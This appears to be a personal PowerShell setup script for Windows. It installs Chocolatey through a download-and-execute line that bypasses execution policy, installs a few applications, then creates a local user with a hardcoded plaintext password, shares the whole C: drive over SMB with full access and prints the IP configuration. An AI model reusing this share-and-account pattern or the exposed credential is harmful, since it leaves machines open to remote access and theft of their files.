Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install googlechrome -y
choco install vscodium -y
choco install winrar -y

pause

# Make sure you run PowerShell as an administrator

# Define the share name
$ShareName = "C"

# Define the path of the drive you want to share
$Path = "C:\"

# Define the password
$Password = ConvertTo-SecureString "idkfa792" -AsPlainText -Force

# Define the username
$Username = "dario"

# Create the new user account
New-LocalUser -Name $Username -Password $Password

# Create a new SMB share
New-SmbShare -Name $ShareName -Path $Path -FullAccess "dario"

# Grant permissions to the share for the new user
Grant-SmbShareAccess -Name $ShareName -AccountName $Username -AccessRight Full


pause
clear
ipconfig
pause
